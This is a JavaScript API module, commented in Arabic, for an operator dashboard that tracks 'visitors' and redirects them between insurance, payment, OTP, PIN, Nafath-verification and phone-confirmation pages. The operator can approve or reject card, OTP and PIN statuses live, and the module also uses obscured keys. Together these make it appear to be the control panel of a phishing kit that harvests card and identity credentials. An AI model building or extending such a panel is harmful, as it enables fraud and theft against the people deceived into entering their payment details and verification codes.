// ═══════════════════════════════════════════════════════
// خدمة API للوحة التحكم - الاتصال بالخادم
// ═══════════════════════════════════════════════════════

// الاتصال بالخادم المحلي أو البعيد
const API_BASE = import.meta.env.VITE_API_URL || 'http://localhost:3001';
const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || 'http://localhost:3001';

// ═══════════════════════════════════════════════════════
// REST API Functions
// ═══════════════════════════════════════════════════════

export const api = {
  // جلب جميع الزوار
  async getAllVisitors() {
    try {
      const response = await fetch(`${API_BASE}/api/visitors`);
      if (!response.ok) throw new Error('فشل في جلب الزوار');
      return await response.json();
    } catch (error) {
      console.error('خطأ في جلب الزوار:', error);
      throw error;
    }
  },

  // جلب زائر واحد
  async getVisitor(visitorId) {
    try {
      const response = await fetch(`${API_BASE}/api/visitors/${visitorId}`);
      if (!response.ok) throw new Error('فشل في جلب الزائر');
      return await response.json();
    } catch (error) {
      console.error('خطأ في جلب الزائر:', error);
      throw error;
    }
  },

  // تحديث بيانات زائر
  async updateVisitor(visitorId, data) {
    try {
      const response = await fetch(`${API_BASE}/api/visitors/${visitorId}`, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });
      if (!response.ok) throw new Error('فشل في تحديث الزائر');
      return await response.json();
    } catch (error) {
      console.error('خطأ في تحديث الزائر:', error);
      throw error;
    }
  },

  // تحويل زائر لصفحة معينة
  async redirectVisitor(visitorId, targetPage) {
    try {
      const response = await fetch(`${API_BASE}/api/visitors/${visitorId}/redirect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ targetPage }),
      });
      if (!response.ok) throw new Error('فشل في تحويل الزائر');
      return await response.json();
    } catch (error) {
      console.error('خطأ في تحويل الزائر:', error);
      throw error;
    }
  },

  // إضافة سجل تاريخ
  async addHistory(visitorId, historyData) {
    try {
      const response = await fetch(`${API_BASE}/api/visitors/${visitorId}/history`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(historyData),
      });
      if (!response.ok) throw new Error('فشل في إضافة السجل');
      return await response.json();
    } catch (error) {
      console.error('خطأ في إضافة السجل:', error);
      throw error;
    }
  },

  // حظر زائر
  async blockVisitor(visitorId) {
    try {
      const response = await fetch(`${API_BASE}/api/visitors/${visitorId}/block`, {
        method: 'POST',
      });
      if (!response.ok) throw new Error('فشل في حظر الزائر');
      return await response.json();
    } catch (error) {
      console.error('خطأ في حظر الزائر:', error);
      throw error;
    }
  },

  // إلغاء حظر زائر
  async unblockVisitor(visitorId) {
    try {
      const response = await fetch(`${API_BASE}/api/visitors/${visitorId}/unblock`, {
        method: 'POST',
      });
      if (!response.ok) throw new Error('فشل في إلغاء حظر الزائر');
      return await response.json();
    } catch (error) {
      console.error('خطأ في إلغاء حظر الزائر:', error);
      throw error;
    }
  },

  // جلب الرسائل
  async getMessages(visitorId) {
    try {
      const response = await fetch(`${API_BASE}/api/visitors/${visitorId}/messages`);
      if (!response.ok) throw new Error('فشل في جلب الرسائل');
      return await response.json();
    } catch (error) {
      console.error('خطأ في جلب الرسائل:', error);
      throw error;
    }
  },

  // إرسال رسالة
  async sendMessage(visitorId, message, senderName = 'لوحة التحكم') {
    try {
      const response = await fetch(`${API_BASE}/api/visitors/${visitorId}/messages`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message, senderName }),
      });
      if (!response.ok) throw new Error('فشل في إرسال الرسالة');
      return await response.json();
    } catch (error) {
      console.error('خطأ في إرسال الرسالة:', error);
      throw error;
    }
  },

  // جلب الإعدادات العامة
  async getPublicSettings() {
    try {
      const response = await fetch(`${API_BASE}/api/visitors/public-settings`);
      if (!response.ok) throw new Error('فشل في جلب الإعدادات');
      return await response.json();
    } catch (error) {
      console.error('خطأ في جلب الإعدادات:', error);
      throw error;
    }
  },
};

// ═══════════════════════════════════════════════════════
// خريطة الصفحات
// ═══════════════════════════════════════════════════════

export const pageMap = {
  'home-new': '/home-new',
  'home': '/home-new',
  'insur': '/insur',
  'compar': '/compar',
  'check': '/check',
  'payment': '/check',
  'otp': '/step2',
  'veri': '/step2',
  '_t2': '/step2',
  'pin': '/step3',
  'confi': '/step3',
  '_t3': '/step3',
  'nafad': '/step4',
  '_t6': '/step4',
  'phone': '/step5',
  'phone-info': '/step5',
  '_t5': '/step5',
  'thank-you': '/thank-you',
};

// ═══════════════════════════════════════════════════════
// Labels للصفحات
// ═══════════════════════════════════════════════════════

export const pageLabels = {
  'home-new': 'الرئيسية',
  'home': 'الرئيسية',
  'insur': 'بيانات التأمين',
  'compar': 'مقارنة العروض',
  'check': 'الدفع',
  'payment': 'الدفع',
  'otp': 'التحقق OTP',
  'veri': 'التحقق',
  '_t2': 'التحقق OTP',
  'pin': 'إدخال PIN',
  'confi': 'التأكيد',
  '_t3': 'إدخال PIN',
  'nafad': 'التحقق نفاذ',
  '_t6': 'التحقق نفاذ',
  'phone': 'تأكيد الهاتف',
  'phone-info': 'بيانات الهاتف',
  '_t5': 'تأكيد الهاتف',
  'thank-you': 'شكراً',
};

// ═══════════════════════════════════════════════════════
// Labels للحالات
// ═══════════════════════════════════════════════════════

export const statusLabels = {
  cardStatus: {
    pending: 'قيد الانتظار',
    approved_with_otp: 'موافق (OTP)',
    approved_with_pin: 'موافق (PIN)',
    rejected: 'مرفوض',
  },
  _v5Status: {
    pending: 'قيد الانتظار',
    verifying: 'جاري التحقق',
    approved: 'موافق',
    rejected: 'مرفوض',
  },
  _v6Status: {
    pending: 'قيد الانتظار',
    verifying: 'جاري التحقق',
    approved: 'موافق',
    rejected: 'مرفوض',
  },
  _v4Status: {
    pending: 'قيد الانتظار',
    approved: 'موافق',
    rejected: 'مرفوض',
  },
  nafadConfirmationStatus: {
    waiting: 'في الانتظار',
    approved: 'موافق',
    rejected: 'مرفوض',
  },
};

// ═══════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════

export const helpers = {
  formatDate(dateString) {
    if (!dateString) return '-';
    const date = new Date(dateString);
    return date.toLocaleDateString('ar-SA', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  },

  timeAgo(dateString) {
    if (!dateString) return '-';
    const date = new Date(dateString);
    const now = new Date();
    const diff = now - date;
    const minutes = Math.floor(diff / 60000);
    const hours = Math.floor(diff / 3600000);
    const days = Math.floor(diff / 86400000);

    if (minutes < 1) return 'الآن';
    if (minutes < 60) return `منذ ${minutes} دقيقة`;
    if (hours < 24) return `منذ ${hours} ساعة`;
    return `منذ ${days} يوم`;
  },

  formatCurrency(amount) {
    if (!amount) return '-';
    return new Intl.NumberFormat('ar-SA', {
      style: 'currency',
      currency: 'SAR',
    }).format(amount);
  },

  getStatusColor(status, type = 'default') {
    const colors = {
      default: {
        pending: 'bg-amber-100 text-amber-700',
        verifying: 'bg-blue-100 text-blue-700',
        approved: 'bg-green-100 text-green-700',
        approved_with_otp: 'bg-green-100 text-green-700',
        approved_with_pin: 'bg-green-100 text-green-700',
        rejected: 'bg-red-100 text-red-700',
        waiting: 'bg-amber-100 text-amber-700',
        online: 'bg-green-100 text-green-700',
        offline: 'bg-gray-100 text-gray-700',
        blocked: 'bg-red-100 text-red-700',
      },
    };
    return colors.default[status] || 'bg-gray-100 text-gray-700';
  },
};

export { SOCKET_URL };
